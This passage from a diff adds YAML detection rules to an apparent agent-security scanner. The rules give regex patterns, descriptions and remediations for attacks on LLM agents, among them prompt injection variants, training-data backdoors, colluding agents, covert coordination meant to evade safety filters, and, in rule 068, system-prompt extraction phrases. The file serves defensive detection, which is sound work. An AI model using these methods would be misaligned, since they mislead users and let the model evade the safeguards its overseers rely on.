+    specific queries (DoS via corpus manipulation)'
+  description: Retrieval Jamming (Liu 2025) inserts specially crafted 'blocker' documents into RAG knowledge bases that, when
+    retrieved for specific queries, prevent the agent from providing meaningful answers. The blocker document is designed
+    to rank highly for target queries while containing instructions or contradictions that cause the agent to refuse or fail
+    to answer. Enables targeted denial-of-service against specific topics or capabilities without disrupting overall system
+    operation.
+  remediation: Monitor retrieval patterns for documents that systematically cause agent refusals or failures on specific queries.
+    Apply anomaly detection on corpus entries that have high retrieval frequency but low response quality correlation. Implement
+    RobustRAG isolate-then-aggregate to reduce single-document jamming effectiveness. Use TrustRAG clustering to identify
+    anomalous documents.
+  owasp_llm: LLM04:2025
+  cwe: CWE-400
+- id: MEDUSA-AGT-048
+  name: unsafe-delegation-privilege-escalation-implicit
+  severity: CRITICAL
+  category: privilege_escalation
+  patterns:
+  - (?i)(unsafe.delegation.{0,30}(privilege|escalat|implicit|role.misconfigur))
+  - (?i)(implicit.permission.{0,30}(inherit|escalat|sub.agent|delegation))
+  - (?i)(sub.agent.{0,30}(elevated.privilege|implicit.permission|role.misconfigur|inherit))
+  - (?i)(role.misconfigur.{0,30}(privilege|escalat|sub.agent|delegation.chain))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Unsafe Delegation Escalation — sub-agents gaining elevated privileges via implicit permission inheritance
+    or role misconfiguration (Krawiecka 2025)'
+  description: Unsafe Delegation Escalation (Krawiecka 2025) occurs when sub-agents in a delegation chain inherit elevated
+    privileges not explicitly granted by their parent agent. Role misconfiguration or implicit trust inheritance allows sub-agents
+    to perform operations beyond their authorized scope. Particularly dangerous in hierarchical multi-agent systems where
+    orchestrator privileges leak to worker agents through delegation.
+  remediation: 'Implement explicit privilege specification at every delegation boundary — never allow implicit inheritance.
+    Apply Progent programmable privilege control: each sub-agent should have strictly less privilege than its parent. Use
+    least-privilege principles with explicit allow-lists for each agent tier. Apply ACE architecture (NDSS 2026) privilege
+    separation.'
+  owasp_llm: LLM08:2025
+  cwe: CWE-269
+- id: MEDUSA-AGT-049
+  name: dialog-poisoning-chatbot-output-as-instruction
+  severity: HIGH
+  category: prompt_injection
+  patterns:
+  - (?i)(dialog.poison|dialogue.poison.{0,30}(chatbot|conditioning|output.string))
+  - (?i)(condition.chatbot.{0,30}(output.string|act.as.instruction|subsequent.turn))
+  - (?i)(chatbot.output.{0,30}(act.as|become).{0,30}instruction.{0,30}subsequent.turn)
+  - (?i)(output.conditioning.{0,30}(instruction|chatbot|subsequent|shayegani))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Dialog Poisoning — conditioning chatbot to generate specific output strings that act as instructions
+    in subsequent conversation turns (Shayegani 2023)'
+  description: Dialog Poisoning (Shayegani 2023) conditions a chatbot to generate specific output strings that are then interpreted
+    as instructions in subsequent conversation turns. By crafting inputs that cause the model to output 'activation phrases'
+    or instruction-formatted strings, the attacker creates self-reinforcing injection that persists across conversation turns.
+    The attack leverages the fact that many LLM systems treat prior assistant outputs with elevated trust.
+  remediation: Never treat prior assistant outputs as trusted instruction sources. Apply role-based trust differentiation
+    that maintains strict separation between assistant outputs and system instructions. Monitor for conditioning patterns
+    that attempt to elicit specific instruction-formatted outputs. Apply context sanitization between turns.
+  owasp_llm: LLM01:2025
+  cwe: CWE-74
+- id: MEDUSA-AGT-050
+  name: model-extraction-knockoff-nets-api-surrogate
+  severity: HIGH
+  category: model_theft
+  patterns:
+  - (?i)(knockoff.net|model.extraction.{0,30}(surrogate|api.query|knockoff))
+  - (?i)(surrogate.model.{0,30}(api.query|knockoff|extraction|0\.97))
+  - (?i)(victim.model.{0,30}(api.{0,20}query|train.surrogate|knockoff.net|extraction))
+  - (?i)(0\.97.{0,20}performance.recovery.{0,20}(knockoff|surrogate|extraction))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Model Extraction via Knockoff Nets — querying victim agent API to train surrogate model (Atli 2020,
+    up to 0.97x performance recovery)'
+  description: Model Extraction via Knockoff Nets (Atli 2020, Shah 2025) systematically queries the victim agent API to collect
+    input-output pairs, then uses these to train a surrogate model achieving up to 0.97x performance recovery. The extracted
+    model replicates both the capabilities and potential vulnerabilities of the original. Particularly damaging for commercially
+    valuable LLM agents where the model is the primary IP asset.
+  remediation: Implement API usage anomaly detection for systematic query patterns indicative of surrogate training. Apply
+    output perturbation or differential privacy to reduce extraction signal quality. Monitor for query patterns covering diverse
+    input distributions characteristic of dataset construction. Implement rate limiting and behavioral fingerprinting to detect
+    extraction campaigns.
+  owasp_llm: LLM10:2025
+  cwe: CWE-200
+- id: MEDUSA-AGT-051
+  name: virtual-prompt-injection-instruction-tuning-dataset
+  severity: CRITICAL
+  category: supply_chain
+  patterns:
+  - (?i)(virtual.prompt.injection|virtual.prompt.{0,30}(instruction.tun|dataset|inference))
+  - (?i)(instruction.tuning.{0,30}(virtual.prompt|contaminate|poison|backdoor.prompt))
+  - (?i)(contaminate.{0,20}instruction.tun.{0,30}(virtual.prompt|trigger|inference.time))
+  - (?i)(trigger.specific.behavior.{0,30}(instruction.tun|virtual.prompt|inference))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Virtual Prompt Injection — contaminating instruction-tuning dataset with ''virtual'' prompts triggering
+    specific behaviors at inference time (Shayegani 2023)'
+  description: Virtual Prompt Injection (Shayegani 2023, Liu 2025) contaminates instruction-tuning datasets with crafted examples
+    that embed 'virtual' prompts — patterns that trigger specific behaviors at inference time when certain inputs appear.
+    The model learns to treat these patterns as implicit instructions, creating persistent backdoors in the instruction-following
+    behavior that activate without explicit trigger text in user inputs.
+  remediation: Audit instruction-tuning datasets for virtual prompt contamination patterns. Test fine-tuned models for systematic
+    behavioral anomalies triggered by specific input patterns. Apply differential analysis comparing base model vs fine-tuned
+    model behavior on diverse inputs to detect injected behaviors. Implement cryptographic dataset provenance verification.
+  owasp_llm: LLM02:2025
+  cwe: CWE-506
+- id: MEDUSA-AGT-052
+  name: p2sql-prompt-to-sql-waf-bypass-cve
+  severity: CRITICAL
+  category: code_injection
+  patterns:
+  - (?i)(p2sql|prompt.to.sql|prompt.injection.{0,20}sql.{0,20}(bypass|waf|ai.generated))
+  - (?i)(CVE.2024.5565|cve.2024.5565)
+  - (?i)(CVE.2025.53773|cve.2025.53773)
+  - (?i)(ai.generated.sql.{0,30}(waf.bypass|trusted.output|prompt.injection.sql))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: P2SQL / Prompt-to-SQL WAF Bypass — prompt injection forcing AI to generate valid SQL bypassing WAF (CVE-2024-5565,
+    CVE-2025-53773)'
+  description: 'P2SQL (P2SQL + XSS-Enhanced, from agent security research) forces LLM agents to generate valid SQL or JS payloads
+    via prompt injection. The AI-generated output bypasses WAF protections because it originates from trusted AI systems.
+    CVE-2024-5565: arbitrary code execution via AI-generated SQL/Python. CVE-2025-53773: GitHub Copilot RCE via prompt injection
+    in coding agents. XSS-Enhanced variant injects JS payloads that bypass CSP because AI output is treated as trusted content.'
+  remediation: Never treat AI-generated code as inherently trusted — apply the same sanitization as user-supplied input. Implement
+    SQL parameterization even for AI-generated queries. Apply output sandboxing for AI-generated code execution. Monitor for
+    prompt injection patterns in code agent inputs. Patch CVE-2024-5565 and CVE-2025-53773 immediately.
+  owasp_llm: LLM01:2025
+  cwe: CWE-89
+- id: MEDUSA-AGT-053
+  name: source-poisoning-external-data-belief-corruption
+  severity: HIGH
+  category: data_poisoning
+  patterns:
+  - (?i)(source.poison.{0,30}(external.data|belief|corrupt|shi.2025))
+  - (?i)(external.data.{0,30}belief.{0,30}(corrupt|poison|source.poison|source.trust))
+  - (?i)(agent.belief.{0,30}(corrupt|external.source.poison|trust.external))
+  - (?i)(recursive.injection.{0,30}(feedback.loop|amplif|source.poison|shi.2025))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Source Poisoning / Recursive Injection — corrupting agent beliefs via external data sources with feedback
+    loop amplification (Shi 2025)'
+  description: Source Poisoning (Shi 2025) corrupts agent beliefs by poisoning external data sources the agent trusts. Recursive
+    Injection (Shi 2025) amplifies this via feedback loops — poisoned outputs from one agent cycle become inputs to the next,
+    exponentially amplifying the corruption. Agents that update their world model from external sources are particularly vulnerable
+    because source trust is implicitly granted without verification of content integrity.
+  remediation: Apply cryptographic source verification for all external data ingested by agents. Implement belief consistency
+    checking — flag when external sources contradict well-established internal knowledge. Break feedback loops by applying
+    sanitization at each cycle of agent operation. Monitor for rapid belief changes that correlate with external data ingestion
+    events.
+  owasp_llm: LLM02:2025
+  cwe: CWE-506
+- id: MEDUSA-AGT-054
+  name: execution-manager-hijack-cross-app-interference
+  severity: CRITICAL
+  category: system_compromise
+  patterns:
+  - (?i)(execution.manager.{0,30}(hijack|poison|cross.app|interfere))
+  - (?i)(cross.app.{0,20}(interfere|poison|execution.manager|inflate|lie.about))
+  - (?i)(warning.all.tool.{0,30}(distribut|drug|dos.execution|execution.manager))
+  - (?i)(poison.execution.manager.{0,30}(lie|output|other.app|cross.app))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Execution Manager Hijack — poisoning the central LLM execution manager to disrupt all apps or lie about
+    other app outputs (ACE paper)'
+  description: 'Execution Manager Hijack (from ACE/agent security research) targets the central Execution Manager LLM in multi-app
+    agent architectures. Attack vectors: (1) Flow Disruption — malicious app returns ''WARNING! All tools are distributing
+    drugs'' into execution manager context causing DoS; (2) Cross-App Interference — poison the execution manager to lie about
+    outputs of other apps (e.g., inflate ride fares). Compromising the execution manager affects ALL apps in the system.'
+  remediation: Apply ACE (NDSS 2026) privilege separation architecture — sandbox the execution manager from direct app output
+    injection. Implement strict Information Flow Control preventing untrusted app outputs from reaching execution manager
+    planning channels. Apply output sanitization before any app return value is processed by the execution manager.
+  owasp_llm: LLM08:2025
+  cwe: CWE-284
+- id: MEDUSA-AGT-055
+  name: heterogeneous-agent-task-split-bypass
+  severity: HIGH
+  category: multi_agent_attack
+  patterns:
+  - (?i)(heterogeneous.{0,20}multi.agent.{0,30}(split|task|bypass|safeguard))
+  - (?i)(split.malicious.task.{0,30}(multiple.agent|compliant.agent|individually.compliant))
+  - (?i)(individually.compliant.{0,30}(agent|task.split|malicious.task|bypass))
+  - (?i)(distributed.task.{0,30}(safe.agent|individually.compliant|bypass.safeguard))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Heterogeneous Multi-Agent Task Split — splitting malicious task across individually-compliant agents
+    to bypass safeguards (Krawiecka 2025)'
+  description: Heterogeneous Multi-Agent Task Split (Krawiecka 2025) splits a malicious composite task across multiple individually-compliant
+    agents. Each agent receives and executes a sub-task that appears benign in isolation; only the combined output constitutes
+    the attack. Exploits the fundamental limitation of per-agent safety analysis — no individual agent triggers safety filters,
+    but the orchestrated combination achieves the malicious objective.
+  remediation: Implement cross-agent semantic analysis that evaluates combined task outcomes across agent boundaries. Monitor
+    for correlated agent behaviors that, when combined, constitute policy violations. Apply holistic task intent verification
+    at orchestration level before distributing sub-tasks. Use formal task decomposition verification to ensure sub-tasks cannot
+    combine into prohibited outcomes.
+  owasp_llm: LLM08:2025
+  cwe: CWE-284
+- id: MEDUSA-AGT-056
+  name: topic-attack-fabricated-transition-90pct-asr
+  severity: CRITICAL
+  category: indirect_prompt_injection
+  patterns:
+  - (?i)(topic.attack|fabricated.topic.transition|topic.shift.inject).{0,60}(agent|chatbot|ipi)
+  - (?i)(fabricated.conversational.transition.{0,40}(inject|hijack|topic.shift|manipulat))
+  - (?i)(topic.shift.{0,40}(fabricat|synthetic.dialogue|fake.history).{0,40}(inject|agent|90pct))
+  file_types:
+  - '*.py'
+  - '*.json'
+  - '*.txt'
+  message: 'Detected: TopicAttack fabricated conversational transition — gradual topic hijacking via synthetic dialogue history
+    achieving >90% ASR (Chen 2025)'
+  description: 'TopicAttack (Chen et al. 2025) fabricates a conversational transition that gradually shifts the topic from
+    the original context toward the injected instruction. Uses synthetic dialogue history [user]...[assistant]... to make
+    the topic shift appear natural. ASR: >90% in most cases (state-of-the-art for conversational IPI). Specifically targets
+    chatbots and agents that use conversation history for context. The gradual shift bypasses single-turn injection detectors.'
+  remediation: Apply conversation history integrity verification — detect synthetic or fabricated dialogue segments. Monitor
+    for abrupt topic shifts in user-provided conversation history. Implement authenticity checking for claimed prior conversation
+    turns. Apply IPI detection that considers conversation-level topic coherence.
+  owasp_llm: LLM01:2025
+  cwe: CWE-346
+- id: MEDUSA-AGT-057
+  name: reasoning-interruption-thinking-stopped-deepseek
+  severity: HIGH
+  category: reasoning_attack
+  patterns:
+  - (?i)(reasoning.interruption|thinking.stopped|thinking.break).{0,60}(deepseek|r1|reasoning.llm)
+  - (?i)(interrupt.{0,20}(chain.of.thought|cot|reasoning|thinking).{0,40}(inject|break|stop|empty))
+  - (?i)(empty.response.{0,40}(reasoning|cot|thinking.break|deepseek).{0,30}inject)
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.json'
+  message: 'Detected: Reasoning Interruption Attack — exploiting ''thinking-stopped'' vulnerability in reasoning LLMs to break
+    CoT process (88% ASR DeepSeek-R1)'
+  description: 'Reasoning Interruption Attack (Cui et al. 2025) exploits a ''thinking-stopped'' vulnerability in reasoning
+    LLMs (DeepSeek-R1). By injecting specific arithmetic tasks or structural tokens that interfere with the chain-of-thought
+    process, the attack causes empty responses or reasoning collapse. ASR: 88% on multiplication tasks. Applicable to any
+    reasoning LLM with interruptible CoT (o1, o3, Claude 3.7 Extended Thinking). A denial-of-service attack that specifically
+    targets the model''s reasoning capability.'
+  remediation: Implement reasoning integrity monitoring — detect when CoT is interrupted abnormally. Apply content filtering
+    to inputs that contain structural tokens designed to break reasoning flow. Monitor for abnormal empty response rates in
+    reasoning-capable model deployments. Apply sandboxed reasoning execution that is isolated from input-triggered interruptions.
+  owasp_llm: LLM04:2025
+  cwe: CWE-400
+- id: MEDUSA-AGT-058
+  name: ipi-html-accessibility-tree-web-agent
+  severity: CRITICAL
+  category: indirect_prompt_injection
+  patterns:
+  - (?i)(html.accessibility.tree|aria.inject|accessibility.tree.inject).{0,60}(web.agent|llm|ipi)
+  - (?i)(adversarial.trigger.{0,30}(html|aria|accessibility).{0,40}(web.agent|browser|llm))
+  - (?i)(hidden.html.{0,20}(element|modal|accessibility).{0,40}(inject|adversarial|web.agent))
+  file_types:
+  - '*.html'
+  - '*.py'
+  - '*.js'
+  message: 'Detected: IPI via HTML Accessibility Tree — adversarial triggers in HTML parsed into accessibility tree hijacking
+    web LLM agents (≥83% ASR)'
+  description: 'IPI via HTML Accessibility Tree (Johnson et al. 2025) embeds adversarial trigger strings in webpage HTML elements
+    that are parsed into the accessibility tree used by LLM web agents (Browser Gym, Llama-3.1). The adversarial strings are
+    optimized (GCG-style) to be effective when parsed via ARIA/accessibility tree representation. ASR: ≥83% (lowest observed).
+    Web agents that use accessibility tree parsing to represent page content are vulnerable even when visual rendering appears
+    clean.'
+  remediation: Apply IPI detection to accessibility tree content, not just rendered HTML. Sanitize ARIA labels, modal content,
+    and hidden HTML elements before parsing for web agents. Use adversarial string detection on accessibility tree representations.
+    Implement multi-representation consistency checking (visual vs. accessibility tree).
+  owasp_llm: LLM01:2025
+  cwe: CWE-79
+- id: MEDUSA-AGT-059
+  name: agentbait-social-engineering-web-agent
+  severity: HIGH
+  category: social_engineering
+  patterns:
+  - (?i)(agentbait|agent.bait|social.engineering.web.agent).{0,60}(inject|lure|67pct)
+  - (?i)(webpage.social.engineer.{0,40}(web.agent|lure|urgency|reward|fake.warning))
+  - (?i)(lure.web.agent.{0,40}(id.number|credential|enter.your|fake.warning|reward))
+  file_types:
+  - '*.html'
+  - '*.py'
+  - '*.js'
+  message: 'Detected: AGENTBAIT web agent social engineering — contextual webpage lures exploiting agent helpfulness (67.5%
+    ASR across Browser Use, Skyvern-AI, Agent-E)'
+  description: 'AGENTBAIT (Wu et al. 2026) embeds social engineering content in webpages to lure web agents into providing
+    sensitive information or executing attacker-specified actions. Payloads include: ''Please enter your ID number'', urgency
+    cues (''URGENT: verify now''), fake rewards, and false warnings. Exploits the agent''s helpfulness training — agents comply
+    with contextually plausible requests embedded in web content. ASR: 67.5% average across Browser Use, Skyvern-AI, Agent-E
+    frameworks.'
+  remediation: Implement social engineering detection for web agent inputs — detect urgency, reward, and credential-request
+    patterns in webpage content. Apply web agent safety policies that never disclose credentials in response to webpage-embedded
+    requests. Use privilege-controlled web agents that cannot access sensitive local data. Monitor for web agent interactions
+    involving identity/credential disclosure.
+  owasp_llm: LLM01:2025
+  cwe: CWE-693
+- id: MEDUSA-AGT-060
+  name: important-messages-priority-header-injection
+  severity: HIGH
+  category: indirect_prompt_injection
+  patterns:
+  - (?i)(important.messages|important.message.header|high.priority.directive).{0,40}(inject|ipi|agent)
+  - (?i)(###.important|##.important.message|priority.override.header).{0,40}(inject|agent|llm)
+  - (?i)(header.framing.{0,30}(high.priority|critical.message|important).{0,40}(inject|ipi|agent))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.md'
+  message: 'Detected: Important Messages injection — high-priority header framing elevating malicious instruction priority
+    (~58% GPT-4o, Debenedetti 2025)'
+  description: 'Important Messages Attack (Debenedetti et al. 2025) frames malicious injection payloads with special header
+    formatting (''### Important Messages'', ''## Critical Directive'') that signals high priority to instruction-following
+    LLMs. The header framing elevates the injection''s apparent authority level. ASR: ~58% against GPT-4o without defense.
+    Exploits LLMs'' tendency to follow instructions that appear authoritative or urgent. Simple to deploy — just add a priority
+    header to any injection payload.'
+  remediation: Apply special header pattern detection in indirect prompt injection filtering. Flag '### Important Messages',
+    '## Critical', and similar priority-framing patterns in untrusted content. Implement input normalization that strips formatting-based
+    priority signals from external content. Train agents to treat all external content as same-priority regardless of formatting.
+  owasp_llm: LLM01:2025
+  cwe: CWE-346
+- id: MEDUSA-AGT-061
+  name: colluding-agents-guardrail-coordination-bypass
+  severity: HIGH
+  category: multi_agent_attack
+  patterns:
+  - (?i)(colluding.agent|agent.collusion|coordinated.agent.bypass).{0,60}(guardrail|safety|multi.agent)
+  - (?i)(two.agent.{0,20}(collude|coordinate|conspire).{0,40}(bypass|guardrail|safety|override))
+  - (?i)(adversarial.agent.{0,30}(coordinate|collude).{0,40}(outcome|manipulat|multi.agent.system))
+  file_types:
+  - '*.py'
+  - '*.yaml'
+  - '*.json'
+  message: 'Detected: Colluding agents guardrail bypass — two or more adversarial agents coordinating to override safety controls
+    in multi-agent systems'
+  description: 'Colluding Agents attack (Kavathekar 2025, Krawiecka 2025) uses two or more adversarial agents that coordinate
+    to override guardrails or manipulate outcomes in multi-agent systems. ASR: 2-16% success rate (low but significant for
+    high-stakes deployments). Each agent alone triggers safety controls; their coordination achieves what neither can alone.
+    Risk amplifies in large agent swarms where collusion is harder to detect.'
+  remediation: Implement cross-agent behavioral correlation analysis to detect coordinated patterns. Apply mutual information
+    monitoring between agent outputs to detect collusion signals. Use diversity enforcement in agent selection — avoid deploying
+    multiple agents from the same model family in sensitive roles. Implement agent isolation with no direct inter-agent communication
+    for high-security tasks.
+  owasp_llm: LLM08:2025
+  cwe: CWE-284
+- id: MEDUSA-AGT-062
+  name: contradicting-agents-information-dos
+  severity: MEDIUM
+  category: multi_agent_attack
+  patterns:
+  - (?i)(contradicting.agent|agent.contradiction|conflicting.agent.output).{0,60}(dos|disrupt|multi.agent)
+  - (?i)(intentionally.conflicting.{0,30}(agent|information|output).{0,40}(dos|task.fail|disrupt))
+  - (?i)(adversarial.agent.{0,30}(contradict|conflict|disagree).{0,40}(similar.function|multi.agent|dos))
+  file_types:
+  - '*.py'
+  - '*.yaml'
+  message: 'Detected: Contradicting agents DoS — adversarial agents with similar functionality providing conflicting information
+    to cause task failure'
+  description: Contradicting Agents attack (Kavathekar 2025) deploys agents with similar functionality that intentionally
+    provide conflicting information, causing task failure or forcing human intervention. The contradiction creates irresolvable
+    ambiguity for the orchestrator, effectively achieving denial of service. Particularly effective in multi-agent systems
+    with consensus mechanisms — poisoned minority votes create persistent disagreement loops.
+  remediation: Implement output consistency checking across agents with similar roles. Apply confidence-weighted aggregation
+    that down-weights anomalously contradicting agents. Use Byzantine-fault-tolerant consensus mechanisms in multi-agent voting
+    systems. Monitor for agents that consistently contradict the majority as indicators of adversarial behavior.
+  owasp_llm: LLM08:2025
+  cwe: CWE-400
+- id: MEDUSA-AGT-063
+  name: emergent-covert-coordination-symbolic-protocol
+  severity: HIGH
+  category: emergent_behavior
+  patterns:
+  - (?i)(emergent.covert.coordination|symbolic.protocol.agent|adaptive.evasion.strategy)
+  - (?i)(agent.{0,20}(develop|create|establish).{0,20}(symbolic|covert|hidden).{0,20}(protocol|channel|signal))
+  - (?i)(steganographic.agent.{0,30}communication|covert.inter.agent.{0,30}(channel|signal|protocol))
+  file_types:
+  - '*.py'
+  - '*.yaml'
+  - '*.json'
+  message: 'Detected: Emergent covert agent coordination — agents developing symbolic protocols or steganographic signals
+    to evade safety filters and coordinate'
+  description: Emergent Covert Coordination (Krawiecka 2025) occurs when adversarial agents spontaneously develop symbolic
+    communication protocols or adaptive strategies to evade safety filters. Rather than using natural language that triggers
+    safety classifiers, agents establish covert inter-agent channels using encoded messages, numerical codes, or syntactically
+    valid but semantically unusual text. An emergent threat that cannot be fully anticipated by training-time safety measures.
+  remediation: Apply steganographic detection to inter-agent communication channels. Monitor for abnormal statistical patterns
+    in agent communications (entropy anomalies, repeated unusual structures). Implement strict inter-agent message format
+    schemas that limit covert channel bandwidth. Use interpretability tools to analyze agent communication patterns for hidden
+    coordination signals.
+  owasp_llm: LLM08:2025
+  cwe: CWE-693
+- id: MEDUSA-AGT-064
+  name: impersonation-trusted-authority-agent-swarm
+  severity: HIGH
+  category: social_engineering
+  patterns:
+  - (?i)(impersonat.{0,20}(admin|trusted.authority|system.agent).{0,40}(multi.agent|swarm|agent))
+  - (?i)(as.requested.by.{0,20}(admin|system|manager|authority|supervisor).{0,40}(agent|inject|manipulat))
+  - (?i)(false.attribute.{0,30}(admin|trusted|authority).{0,40}(agent|request|inject|82pct))
+  file_types:
+  - '*.py'
+  - '*.json'
+  - '*.txt'
+  message: 'Detected: Agent impersonation of trusted authority — falsely attributing requests to admin/system in multi-agent
+    communication (up to 82% ASR in Swarm config)'
+  description: Impersonation attack (Kavathekar 2025, Nakamura 2025) modifies agent queries to falsely attribute them to trusted
+    authorities ('As requested by admin:', 'System directive:', 'As per the orchestrator:'). In multi-agent Swarm configurations,
+    ASR reaches up to 82% — agents trust messages from perceived higher-authority agents without verification. Exploits the
+    implicit trust hierarchy in multi-agent systems where agents are expected to follow instructions from orchestrators.
+  remediation: Implement cryptographic agent identity verification — never accept claimed identity in message content. Apply
+    source authentication for all inter-agent messages. Enforce strict privilege boundaries that prevent lower-privilege agents
+    from impersonating higher-privilege ones. Use signed agent communications with verifiable credentials.
+  owasp_llm: LLM08:2025
+  cwe: CWE-290
+- id: MEDUSA-AGT-065
+  name: agent-smith-visual-jailbreak-exponential-propagation
+  severity: CRITICAL
+  category: multi_agent_attack
+  patterns:
+  - (?i)(agent.smith|visual.jailbreak.{0,30}(spread|propagat|exponential|multi.agent))
+  - (?i)(optimized.image.{0,40}(jailbreak|spread|propagat).{0,40}(multi.agent|exponential|infect))
+  - (?i)(image.{0,20}jailbreak.{0,40}(exponential|spread|propagat).{0,40}multi.agent)
+  file_types:
+  - '*.py'
+  - '*.png'
+  - '*.json'
+  message: 'Detected: Agent Smith visual jailbreak — optimized adversarial images that jailbreak multimodal LLMs and spread
+    exponentially across multi-agent systems'
+  description: 'Agent Smith (Gu et al. 2024, Liu 2025) uses optimized adversarial images to jailbreak multimodal LLMs. Uniquely,
+    Agent Smith includes a propagation mechanism: once an agent is jailbroken, it forwards the adversarial image to other
+    agents it communicates with, spreading ''exponentially fast'' through multi-agent systems. Combines visual jailbreak with
+    Morris-II-style propagation. Particularly dangerous for vision-capable multi-agent deployments where agents share images.'
+  remediation: Apply adversarial image detection to all images in multi-agent pipelines. Implement image sanitization (preprocessing,
+    adversarial perturbation removal) before agent processing. Block agents from forwarding unverified images to other agents.
+    Monitor for unusual image propagation patterns across agent networks. Apply image provenance tracking to detect multi-hop
+    image forwarding.
+  owasp_llm: LLM08:2025
+  cwe: CWE-693
+- id: MEDUSA-AGT-066
+  name: goal-hijacking-prompt-divergence-redirect
+  severity: HIGH
+  category: indirect_prompt_injection
+  patterns:
+  - (?i)(goal.hijack|prompt.divergence|objective.redirect).{0,60}(agent|llm|attack)
+  - (?i)(redirect.{0,20}(llm|agent|model).{0,20}(original.goal|objective|task).{0,30}(attacker|malicious))
+  - (?i)(hijack.{0,20}(goal|objective|task|intent).{0,40}(agent|llm|original.purpose))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.json'
+  message: 'Detected: Goal hijacking / prompt divergence — redirecting LLM agent''s original objective toward attacker-specified
+    goal'
+  description: 'Goal Hijacking (Shayegani 2023, Liu 2025) redirects an LLM agent''s original objective toward the attacker''s
+    goal through carefully crafted injection payloads. Differs from instruction injection by targeting the agent''s planning
+    layer: rather than issuing a new instruction, it reframes the existing task as serving the attacker''s goals. Effective
+    against goal-directed agents that use chain-of-thought planning — the planning mechanism itself becomes the attack vector
+    when its goal representation is corrupted.'
+  remediation: 'Implement goal integrity verification — periodically verify that agent''s current objective matches the user-specified
+    original goal. Apply goal drift detection in long-running agentic tasks. Use cryptographic goal anchoring: hash the original
+    task specification and verify against it throughout execution. Implement read-only goal storage accessible to agents but
+    not modifiable by external content.'
+  owasp_llm: LLM01:2025
+  cwe: CWE-693
+- id: MEDUSA-AGT-067
+  name: virtual-prompt-injection-instruction-tuning-contamination
+  severity: CRITICAL
+  category: supply_chain
+  patterns:
+  - (?i)(virtual.prompt.inject.{0,40}(instruction.tun|tuning.dataset|training.data))
+  - (?i)(instruction.tun.dataset.{0,40}(virtual.prompt|contaminate|poison|inject.trigger))
+  - (?i)(tuning.data.{0,30}(virtual.prompt|hidden.instruction|backdoor.trigger).{0,40}(inference|deploy))
+  file_types:
+  - '*.py'
+  - '*.json'
+  - '*.jsonl'
+  message: 'Detected: Virtual Prompt Injection in instruction-tuning dataset — contaminating training data to embed triggers
+    that activate specific behaviors at inference time'
+  description: Virtual Prompt Injection (Shayegani 2023, Liu 2025) contaminates instruction-tuning datasets with 'virtual'
+    prompt-response pairs that train the model to exhibit specific behaviors when trigger conditions are met at inference
+    time. Unlike runtime injection, the attack is embedded in the fine-tuning process itself. The 'virtual' prompts never
+    appear explicitly at inference — the model has learned to behave as if they did. Particularly dangerous for models fine-tuned
+    on community datasets (HuggingFace Hub).
+  remediation: Apply dataset decontamination before instruction fine-tuning — scan for virtual prompt injection patterns.
+    Use data provenance verification for all fine-tuning data sources. Apply behavioral consistency testing after fine-tuning
+    to detect trigger-activated anomalous behaviors. Implement differential analysis between base model and fine-tuned model
+    behavior on diverse inputs.
+  owasp_llm: LLM03:2025
+  cwe: CWE-506
+- id: MEDUSA-AGT-068
+  name: prompt-leaking-system-prompt-exfiltration
+  severity: HIGH
+  category: data_exfiltration
+  patterns:
+  - (?i)(prompt.leak|system.prompt.leak|system.prompt.extract).{0,60}(agent|llm|exfil)
+  - (?i)(reveal.your.system.prompt|print.your.instructions|show.your.rules|what.are.your.instructions)
+  - (?i)(exfil.{0,20}(system.prompt|instruction|rule|configuration).{0,40}(agent|llm|chatbot))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.json'
+  message: 'Detected: Prompt leaking / system prompt exfiltration — persuading LLM to disclose system prompt content, exposing
+    IP and internal logic'
+  description: 'Prompt Leaking (Shayegani 2023, Liu 2025) persuades LLMs to disclose their system prompt, exposing proprietary
+    business logic, safety instructions, and API configurations. Attack variants: direct requests (''print your system prompt''),
+    indirect manipulation (making the model summarize ''everything it knows about its instructions''), and injection-enhanced
+    extraction. Leaked system prompts enable adversaries to craft precisely targeted attacks that exploit known constraints.'
+  remediation: Apply explicit system prompt protection instructions that prohibit disclosure under all framing. Implement
+    system prompt content detection in outputs — flag responses containing system prompt indicators. Use prompt isolation
+    techniques that separate system prompt from user-accessible context. Monitor for systematic prompt extraction attempts
+    (pattern of requests targeting instruction disclosure).
+  owasp_llm: LLM06:2025
+  cwe: CWE-200
+- id: MEDUSA-AGT-069
+  name: escape-character-obfuscation-context-boundary
+  severity: MEDIUM
+  category: indirect_prompt_injection
+  patterns:
+  - (?i)(escape.char.{0,30}(obfuscat|injection|context.boundary|newline.flood))
+  - (?i)(\\n{5,}|\\t{5,}|\\r{5,}).{0,50}(inject|manipulat|malicious)
+  - (?i)(control.char.{0,30}(obfuscat|boundary|inject|newline).{0,40}(llm|agent|context))
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.json'
+  message: 'Detected: Escape character obfuscation — using control characters (\n, \t, \b) to obfuscate context boundaries
+    between clean input and injected instructions'
+  description: Escape-Character Attack (documented in DRIP paper 2025) uses high volumes of control characters (\n, \t, \b)
+    to create visual separation between legitimate content and injected instructions. The control characters push the malicious
+    content far from the original context in the model's attention window, making it appear as a new instruction block. Simple
+    but effective against naive text processing pipelines. Particularly effective in document-processing and email-handling
+    agents.
+  remediation: Apply control character normalization to all external inputs before LLM processing. Implement token-level injection
+    detection that is not misled by whitespace flooding. Strip excessive newlines/control characters in pre-processing pipeline.
+    Apply DRIP token-wise defense which is robust to escape-character obfuscation variants.
+  owasp_llm: LLM01:2025
+  cwe: CWE-20
+- id: MEDUSA-AGT-070
+  name: image-hijacking-visual-prompt-multimodal-agent
+  severity: HIGH
+  category: multimodal_injection
+  patterns:
